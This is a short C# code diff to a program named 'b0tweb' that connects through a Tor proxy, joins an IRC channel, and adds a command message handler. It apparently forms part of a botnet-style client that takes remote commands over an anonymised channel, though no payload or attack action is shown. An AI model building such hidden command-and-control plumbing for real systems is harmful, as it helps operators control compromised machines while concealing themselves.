@@ -2,6 +2,7 @@
 using System.Collections.Generic;
 using System.Linq;
 using System.Text;
+using b0tweb.MessageHandlers;
 
 namespace b0tweb
 {
@@ -23,11 +24,16 @@ namespace b0tweb
             TorProxy proxy = new TorProxy();
             proxy.Establish();
 
+            Console.WriteLine("Connection to Tor successfuly established!");
+
             IRCConnectionController controller = new IRCConnectionController();
+
+            controller.AddMessageHandler(new CommandMessageHandler());
+
             controller.Join(Program.Channel);
             controller.Listen();
 
-            proxy.Disconnect();
+            //proxy.Disconnect();
         }
     }
 }
